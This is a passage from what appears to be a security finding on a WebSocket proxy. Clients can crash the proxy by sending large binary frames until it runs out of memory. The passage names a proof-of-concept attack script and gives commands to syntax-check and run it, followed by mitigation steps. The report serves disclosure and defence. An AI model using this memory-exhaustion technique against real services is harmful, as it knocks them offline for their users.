* `attack_inbound_frames.py` is the downstream attacker. It speaks the WebSocket protocol directly using Python's standard library and sends valid masked client frames.
* Docker resource exhaustion observable through `OOMKilled=true`.

This reaches the vulnerable path through normal downstream WebSocket connections. The proxy reads, allocates, and discards the client binary frames before the process is killed.
{% endstep %}
{% endstepper %}

## Validation

PoC file syntax:

```bash
bash -n f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
python3 -c "import pathlib; files=['f20_websocket_proxy_poc/scripts/raw_ws.py','f20_websocket_proxy_poc/scripts/mock_upstream.py','f20_websocket_proxy_poc/scripts/attack_inbound_frames.py']; [compile(pathlib.Path(p).read_text(), p, 'exec') for p in files]"
```

Result: passed.

Finding 1 Docker PoC:

```bash
bash f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
```

Result: passed. Docker marked the victim proxy container `OOMKilled=true` with exit code `137`.

## Recommended Mitigation

Reject unexpected client data early and lower inbound limits:

1. Configure `WebSocketUpgrade` with explicit small `max_message_size` and `max_frame_size` values appropriate for a one-directional downstream feed.
2. In `start_reader`, close the connection when receiving client `Text` or `Binary` frames instead of silently discarding them.
3. Add a per-connection inbound byte/frame rate limiter if any client messages must remain supported.
4. Keep ping/pong handling, but make it explicit that only pong and close frames are accepted from downstream clients.
5. Add integration tests that send large inbound frames and assert the proxy closes the connection without large memory growth.

The safest invariant is:

```
Downstream websocket clients must not be able to make the one-directional proxy allocate unbounded inbound message data.
```
